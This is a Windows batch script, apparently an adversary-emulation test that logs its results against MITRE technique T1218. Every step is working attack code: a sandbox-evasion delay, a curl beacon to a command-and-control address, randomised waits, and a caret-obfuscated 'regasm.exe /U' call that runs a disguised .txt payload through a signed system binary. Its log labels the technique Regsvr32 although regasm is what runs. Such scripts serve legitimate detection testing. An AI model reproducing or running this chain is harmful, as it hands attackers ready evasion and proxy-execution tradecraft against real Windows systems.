@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random variable assignments for PHR_ placeholders
SET eivuf=%APPDATA%\8646\cfde7946
SET oyvznk=https://10.0.0.49
SET kbgypu=https://10.0.0.49/stage/2/icon.png?8646-7
SET qmtpjs=ITZEL-S2BO
SET fgcxhn=7
SET uiqmvl=expressvp.txt
SET rwcvhj=8646

REM Log file path variable
SET wlfpek=!APPDATA!\!fgcxhn!\macula-simulations.log

REM Initial sandbox evasion delay
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: delay_start=30s>> "!wlfpek!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: delay_end=30s>> "!wlfpek!" 2>nul

REM Heartbeat to C2 (CRITICAL: no obfuscation)
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: heartbeat_start>> "!wlfpek!" 2>nul
curl -k -s -o nul "!kbgypu!"
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: heartbeat_complete>> "!wlfpek!" 2>nul

REM Random delay between operations
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: delay_start=random>> "!wlfpek!" 2>nul
SET /A rnddly=%RANDOM% %% 20 + 10
timeout /t !rnddly! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: delay_end=!rnddly!s>> "!wlfpek!" 2>nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: chdir_start=!eivuf!>> "!wlfpek!" 2>nul
cd /d "!eivuf!"
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: chdir_result=%errorlevel%>> "!wlfpek!" 2>nul

REM Build obfuscated regasm command with caret escapes
SET lvnhj=r^e^g^a
SET dkfbm=s^m
SET yqtxp=.^e^x^e
SET cbgpl= /U

REM Execute regasm with obfuscated command fragments
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: regasm_start=!uiqmvl!>> "!wlfpek!" 2>nul
!lvnhj!!dkfbm!!yqtxp!!cbgpl! "!uiqmvl!"
SET rslts=%errorlevel%

REM Log TTP execution
SET ttp_result=0
SET err_detail=
IF !rslts! EQU 0 (
    SET ttp_result=1
) ELSE (
    SET err_detail=exec_failed_!rslts!
)
echo [!DATE! !TIME!][!qmtpjs!]: !fgcxhn!-!rwcvhj!-T1218|Regsvr32=!ttp_result!:!err_detail!>> "!wlfpek!" 2>nul
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: regasm_result=!rslts!>> "!wlfpek!" 2>nul

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: delay_start=15s>> "!wlfpek!" 2>nul
ping -n 15 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!qmtpjs!]: delay_end=15s>> "!wlfpek!" 2>nul